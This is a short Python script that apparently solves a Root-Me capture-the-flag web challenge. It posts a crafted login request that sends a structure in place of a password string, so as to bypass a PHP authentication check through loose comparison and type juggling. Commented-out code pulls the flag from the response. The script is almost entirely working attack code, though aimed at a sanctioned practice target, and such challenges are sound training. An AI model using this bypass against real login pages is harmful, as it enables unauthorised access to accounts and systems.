#!/usr/bin/python3 env
import urllib2
import requests
import hashlib

def getpass():
	with open("hashes","r") as f:
		data = f.readlines()
	result = []
	
	for i in range(0, len(data)):
		result.append(data[i].split(":")[0])

	return result





url = "http://challenge01.root-me.org/web-serveur/ch44/auth.php"

s = requests.session()
r = s.get(url)
#print r.text

def encrypt_string(hash_string):
    sha_signature = hashlib.sha256(hash_string.encode()).hexdigest()
    return sha_signature

userpass = getpass()
array = ["","",""]
login = 0
password = array



#======================================================================
# From firefox packets, {'data' :{'login':0,passwd:[[]]}}

#DontForgetPHPL00seComp4r1s0n
#=========================================================================
print("Testing user: %d with password %s"%(login, password))
somestuff = {'lol':True}
payload = {'login':int(0),'password':somestuff}
out = s.post(url,data=payload)

#flag = out.text.split("$flag=&quot;")[1].split("&quot;;")[0]
print out.text+"\n"
